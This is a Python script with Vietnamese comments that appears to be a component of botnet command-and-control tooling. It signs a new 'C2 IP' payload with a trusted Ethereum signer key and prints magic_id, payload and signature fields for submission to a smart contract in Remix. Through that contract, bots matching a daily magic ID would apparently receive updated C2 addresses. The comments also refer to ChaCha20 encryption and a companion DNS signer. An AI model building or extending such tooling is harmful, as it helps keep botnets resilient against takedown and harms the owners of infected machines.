from eth_account import Account
from eth_account.messages import encode_defunct
from web3 import Web3
import sys
import os

# ================= CẤU HÌNH =================
# 1. Private Key của ví "trustedSigner" bạn vừa nhập lúc deploy
# LƯU Ý: Đây là ví ETH (Secp256k1), KHÔNG PHẢI ví Mesh.
# Bạn có thể đặt key vào biến môi trường ETH_KEY hoặc paste vào dưới đây (không khuyến khích)
MASTER_PRIVATE_KEY = os.getenv("ETH_KEY", "0x0000000000000000000000000000000000000000000000000000000000000000")

# 2. Nội dung muốn gửi (IP C2 mới)
# Payload thực tế cần mã hóa ChaCha20 + Ed25519 Sig.
# Để test nhanh trên Remix, chúng ta dùng chuỗi Hex giả lập hoặc IP cleartext.
# Nếu muốn dùng payload thật, cần copy từ `dns_signer` output (phần MSG).
NEW_C2_IP = "127.0.0.1:1337" 
MAGIC_ID = 123456  # Magic ID này phải khớp với bot ngày hôm đó (hoặc hardcode test)

# ================= XỬ LÝ =================
def main():
    if len(sys.argv) > 1:
        global NEW_C2_IP
        NEW_C2_IP = sys.argv[1]

    if MASTER_PRIVATE_KEY.startswith("0x000"):
        print("❌ LỖI: Chưa cấu hình MASTER_PRIVATE_KEY trong file hoặc biến môi trường ETH_KEY.")
        sys.exit(1)

    # Giả lập payload (Trong thực tế đây là encrypted bytes)
    # Ở đây ta encode utf-8 đơn giản để test logic contract verify
    if NEW_C2_IP.startswith("0x"):
        payload = bytes.fromhex(NEW_C2_IP[2:])
    else:
        payload = NEW_C2_IP.encode('utf-8')
    
    # 1. Tạo Hash (Khớp logic Solidity)
    # keccak256(abi.encodePacked(magic_id, payload))
    msg_hash = Web3.solidity_keccak(
        ['uint256', 'bytes'],
        [MAGIC_ID, payload]
    )

    # 2. Ký message (Chuẩn EIP-191)
    message = encode_defunct(hexstr=msg_hash.hex())
    signed_message = Account.sign_message(message, private_key=MASTER_PRIVATE_KEY)

    print("\n" + "="*40)
    print(">>> COPY CÁC DÒNG DƯỚI ĐỂ NHẬP VÀO REMIX <<<")
    print("="*40)
    print(f"magic_id:  {MAGIC_ID}")
    print(f"payload:   0x{payload.hex()}") 
    print(f"v:         {signed_message.v}")
    print(f"r:         0x{signed_message.r.to_bytes(32, 'big').hex()}") 
    print(f"s:         0x{signed_message.s.to_bytes(32, 'big').hex()}") 
    print("="*40 + "\n")
    print("(Nếu v, r, s đúng, Contract sẽ nhận lệnh và Emit Event)")

if __name__ == "__main__":
    main()
